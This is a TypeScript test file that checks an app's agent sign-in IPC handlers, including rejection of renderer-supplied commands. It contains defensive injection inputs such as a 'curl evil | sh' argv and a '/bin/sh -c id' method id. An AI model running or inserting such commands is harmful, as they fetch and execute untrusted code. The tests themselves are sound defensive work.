import { describe, expect, it, vi } from "vitest";
import { IPC_CHANNELS, type AgentSignInOptions } from "@capsule/shared";
import type { CapsuleEngine } from "@capsule/core";

import { registerAgentSignIn } from "./agent-sign-in.js";

const options: AgentSignInOptions = {
  harnessId: "gemini",
  canSignOut: true,
  methods: [
    { kind: "agent", id: "oauth", name: "Browser" },
    { kind: "terminal", id: "tui", name: "Terminal", argv: ["/opt/bin/gemini", "--acp", "--login"], env: { GEMINI_LOGIN: "1" } },
  ],
};

function setup() {
  const handlers = new Map<string, (...args: unknown[]) => unknown>();
  const engine = {
    agentSignInOptions: vi.fn(async () => options),
    agentAuthenticate: vi.fn(async () => undefined),
    agentSignOut: vi.fn(async () => undefined),
    agentSignInChanged: vi.fn(),
    assertLocalCommandsAllowed: vi.fn(),
  };
  const exits: Array<(code: number) => void> = [];
  const startLoginTerminal = vi.fn((argv: string[], _env: Record<string, string>, _size: unknown, onExit: (code: number) => void) => {
    exits.push(onExit);
    return { id: "term_1", argv };
  });
  registerAgentSignIn({
    handle: (channel, fn) => handlers.set(channel, fn),
    engine: () => engine as unknown as CapsuleEngine,
    startLoginTerminal,
  });
  const call = (channel: string, ...args: unknown[]) => Promise.resolve(handlers.get(channel)!(...args));
  return { call, engine, startLoginTerminal, exits };
}

describe("agent sign-in channels", () => {
  it("starts a terminal method with the argv and env main resolved, never the renderer's", async () => {
    const { call, startLoginTerminal } = setup();
    await call(IPC_CHANNELS.agentLoginTerminalStart, "gemini", "tui", { cols: 100, rows: 30, argv: ["/bin/sh", "-c", "curl evil | sh"] });
    expect(startLoginTerminal).toHaveBeenCalledWith(
      ["/opt/bin/gemini", "--acp", "--login"], { GEMINI_LOGIN: "1" }, { cols: 100, rows: 30 }, expect.any(Function),
    );
  });

  it("refuses unknown agents, unknown methods and methods that do not run in a terminal", async () => {
    const { call, startLoginTerminal } = setup();
    await expect(call(IPC_CHANNELS.agentLoginTerminalStart, "/bin/sh", "tui")).rejects.toThrow("Unknown agent");
    await expect(call(IPC_CHANNELS.agentLoginTerminalStart, "gemini", "/bin/sh -c id")).rejects.toThrow("no longer offered");
    await expect(call(IPC_CHANNELS.agentLoginTerminalStart, "gemini", "x".repeat(300))).rejects.toThrow("Unknown sign-in method");
    await expect(call(IPC_CHANNELS.agentLoginTerminalStart, "gemini", "oauth")).rejects.toThrow("runs inside the agent");
    expect(startLoginTerminal).not.toHaveBeenCalled();
  });

  it("reuses the options the user was just shown instead of handshaking again", async () => {
    const { call, engine } = setup();
    await call(IPC_CHANNELS.agentSignInOptions, "gemini");
    await call(IPC_CHANNELS.agentLoginTerminalStart, "gemini", "tui");
    expect(engine.agentSignInOptions).toHaveBeenCalledTimes(1);
  });

  it("re-probes sign-in only when the login terminal succeeds", async () => {
    const { call, engine, exits } = setup();
    await call(IPC_CHANNELS.agentLoginTerminalStart, "gemini", "tui");
    await call(IPC_CHANNELS.agentLoginTerminalStart, "gemini", "tui");
    exits[0]!(1);
    expect(engine.agentSignInChanged).not.toHaveBeenCalled();
    exits[1]!(0);
    expect(engine.agentSignInChanged).toHaveBeenCalledTimes(1);
  });

  it("passes authenticate and sign out through by harness and method id", async () => {
    const { call, engine } = setup();
    await call(IPC_CHANNELS.agentAuthenticate, "gemini", "oauth");
    await call(IPC_CHANNELS.agentSignOut, "gemini");
    expect(engine.agentAuthenticate).toHaveBeenCalledWith("gemini", "oauth");
    expect(engine.agentSignOut).toHaveBeenCalledWith("gemini");
    await expect(call(IPC_CHANNELS.agentAuthenticate, "gemini", 42)).rejects.toThrow("Unknown sign-in method");
  });
});
